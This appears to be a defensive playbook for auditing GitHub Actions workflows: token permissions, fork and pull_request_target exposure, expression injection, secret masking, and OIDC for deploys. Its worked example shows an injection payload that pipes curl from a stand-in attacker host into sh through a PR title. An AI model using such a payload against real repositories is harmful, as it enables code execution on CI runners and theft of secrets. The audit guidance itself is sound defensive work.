# GitHub Actions Secrets and Token Permissions Audit

**One-line description:** Audits and fixes how workflows use secrets and the `GITHUB_TOKEN`: per-job least-privilege `permissions`, no secrets in fork-triggered or `pull_request_target` paths, no `${{ }}` expression injection into shell, environment-scoped deploy secrets, and OIDC in place of long-lived cloud keys.

**Execution Pattern:** Phase Pipeline

---

## Inputs

- `gha_workflow_path` (string, required): A workflow file; the audit covers every file in `.github/workflows/`.

---

## Outputs

- `secrets_findings` (object[]): `{file, line, rule, severity_source, evidence, fix, fixed}` per finding. `severity_source` names the document or tool rule that rates it (for example a zizmor audit name), never a made-up score.

---

## Phase 1: Map Token Permissions and Triggers

### Entry Criteria
- Workflow files exist.

### Actions
1. List triggers: `grep -nE '^on:|^  (pull_request_target|pull_request|workflow_run|issue_comment|push|release|schedule|workflow_dispatch):' .github/workflows/*.yml`.
2. List permissions blocks: `grep -nE '^\s*permissions:' -A6 .github/workflows/*.yml`.
3. Apply these rules, one finding per violation:

| Rule | Check | Fix |
|---|---|---|
| Top-level default | No top-level `permissions:` | Add `permissions: contents: read` at top level |
| Job widening | A job needs write (release, PR comment, package publish) | Grant it in that job only, for example `permissions: contents: write` on the release job |
| `write-all` | `permissions: write-all` anywhere | Replace with the specific scopes the job's steps use |
| OIDC | Job deploys to a cloud | Add `id-token: write` to that job only |

4. Read the repository default token permission: `gh api repos/{owner}/{repo}/actions/permissions/workflow --jq .default_workflow_permissions`. If it prints `write`, report it; the user may set it to `read` in Settings, Actions, General.

### Output
Permission findings.

### Quality Gate
- Every workflow file has a top-level `permissions:` key or a finding.
- No `write-all` remains: `grep -rn 'write-all' .github/workflows` prints nothing after fixes.

---

## Phase 2: Fork and Injection Exposure

### Entry Criteria
- Phase 1 done.

### Actions
1. Fork rule: secrets (other than a read-only `GITHUB_TOKEN`) are not passed to `pull_request` runs from forks. Any job that needs a secret on PRs will fail for forks; do not "fix" that by switching to `pull_request_target`.
2. `pull_request_target` and `workflow_run`: for each file using them, check for checkout of PR code: `grep -nE 'ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(sha|ref)' <file>`. A match in a job that also has secrets or write permission is a finding: untrusted code runs with privileges. Fix by moving the build to a plain `pull_request` workflow and keeping the privileged workflow to labeling or commenting on artifacts it did not execute.
3. Expression injection: find attacker-controlled values expanded directly into `run:` scripts: `grep -nE 'run:.*\$\{\{\s*github\.event\.(issue|pull_request|comment|review|head_commit|commits)|run:.*\$\{\{\s*github\.head_ref' .github/workflows/*.yml` (also inspect multi-line `run: |` blocks by reading them). Fix pattern:
```yaml
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "$PR_TITLE"
```
   The value then reaches the shell as data, not as script text.
4. Secret echo: `grep -nE 'set -x|echo .*secrets\.|printenv|env\s*$' .github/workflows/*.yml`. GitHub masks registered secret values in logs, but not values derived from them (base64, substrings, JSON fields). If a step derives a value from a secret, add `echo "::add-mask::$DERIVED"` before any use.
5. Run zizmor for a second opinion: `zizmor .github/workflows/` (install with `pipx install zizmor` or `cargo install zizmor`). Record its audit names (for example `template-injection`, `dangerous-triggers`, `excessive-permissions`, `artipacked`) as `severity_source`.

### Output
Exposure findings.

### Quality Gate
- The injection grep prints nothing after fixes.
- zizmor output is saved; each of its findings is either fixed or listed with a reason.

---

## Phase 3: Scope Deploy Secrets and Use OIDC

### Entry Criteria
- Exposure findings fixed or recorded.

### Actions
1. List secrets by scope: `gh secret list` (repo), `gh secret list --env <name>` (environment), `gh secret list --org <org>` if the user has access.
2. Any secret used only by a deploy or release job moves to a GitHub Environment (`environment: production` on that job), where the user can add required reviewers and branch restrictions. Moving secrets is a settings change: give the user the exact `gh secret set <NAME> --env production` command; do not read or print secret values.
3. Long-lived cloud keys (`AWS_ACCESS_KEY_ID`, `AZURE_CREDENTIALS`, GCP JSON keys) used in jobs: propose OIDC with the cloud's official action (`aws-actions/configure-aws-credentials` with `role-to-assume`, `azure/login` with client and tenant IDs, `google-github-actions/auth` with `workload_identity_provider`) and `permissions: id-token: write`. The trust policy on the cloud side must restrict the `sub` claim (for example `repo:<owner>/<repo>:environment:production`); report that as a required cloud change.
4. Edit one workflow file per commit, run `actionlint` and push; confirm with `gh run watch --exit-status`.

### Output
`secrets_findings`.

### Quality Gate
- Every finding has `fixed: true` or a recorded reason and owner.
- `actionlint` and the post-fix CI run both pass.

---

## Worked Example

Illustrative only. `.github/workflows/labeler.yml` uses `pull_request_target` and contains `run: echo "Title: ${{ github.event.pull_request.title }}"`.

Phase 2: injection grep prints `labeler.yml:22: run: echo "Title: ${{ github.event.pull_request.title }}"`. A PR titled `"; curl evil.example | sh; "` would execute. Fix moves the title into `env: PR_TITLE`. zizmor before the fix:
```
error[template-injection]: code injection via template expansion
  --> .github/workflows/labeler.yml:22
```
After the fix zizmor prints no `template-injection` finding. Finding recorded with `severity_source: "zizmor template-injection"`, `fixed: true`.

---

## Exit Criteria

DONE when every workflow has least-privilege permissions, no injectable expression reaches a shell, no privileged trigger runs PR code, deploy secrets are environment-scoped or OIDC is proposed, and CI passes.

---

## Error Handling

| Phase | Failure Mode | Response |
|---|---|---|
| Phase 1 | Cannot read repo Actions settings (403) | **Return**: report that an admin must check the default token permission. |
| Phase 2 | `pull_request_target` workflow legitimately needs PR code | **Return**: describe the two-workflow split; the user decides. |
| Phase 2 | zizmor not installable | **Adjust**: rely on the grep checks and record that zizmor did not run. |
| Phase 3 | User cannot change cloud trust policy | **Return**: keep the long-lived key, scope it to an environment, and record OIDC as an open item. |
| Any | A secret value appears in a log | **Stop**: tell the user to rotate it now; deleting the log is not enough. |

---

**License:** Free to use (price: 0 TRUST). Royalties apply to published derivatives.

Copyright 2024-present The Wayfinder Trust. All rights reserved.
